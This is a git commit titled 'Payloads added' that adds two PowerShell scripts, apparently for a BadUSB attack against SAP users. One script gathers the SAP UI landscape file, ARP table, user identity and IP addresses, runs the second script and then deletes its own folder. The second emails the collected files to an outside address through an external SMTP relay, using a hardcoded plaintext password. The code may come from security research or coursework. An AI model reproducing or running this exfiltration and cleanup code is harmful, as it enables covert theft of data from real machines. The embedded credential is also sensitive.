9658e8a79e4a9cc21209e2fbcbbbd4edde67ca67
bananarama <jonathan.stross@stud.h-da.de>
2023-04-12 16:36:38 +0200

    Payloads added

---
+++ ps/gatherdata.ps1
@@ -0,0 +1,8 @@
+﻿Get-Content $env:APPDATA\SAP\Common\SAPUILandscape.xml > landscape.txt
+arp -a > arptable.txt
+whoami > whoami.txt
+Get-NetIPAddress > ipaddress.txt
+.\senddata.ps1
+cd ..\..
+Get-ChildItem -Path "SAPBadUSB" -Recurse | Remove-Item -force -recurse
+Remove-Item "SAPBadUSB" -Force
---
+++ ps/senddata.ps1
@@ -0,0 +1,10 @@
+﻿$From = "Victim <victim@victim.com>"
+$To = "Jonathan Stross <jonathan.stross@stud.h-da.de>"
+$Subject = "Exfiltrated data"
+$Body = "Please find attached the exfiltrated data."
+$SMTPServer = "smtp-relay.sendinblue.com"
+$SMTPPort = "587"
+$Password = ConvertTo-SecureString "7RQ6jML4zFaEZHxX" -AsPlainText -Force
+$Username = "se.patlock@gmail.com"
+$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $Username, $Password
+Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -BodyAsHtml -SmtpServer $SMTPServer -Port $SMTPPort -Credential $Credentials -Attachments "ipaddress.txt", "landscape.txt", "whoami.txt", "arptable.txt"
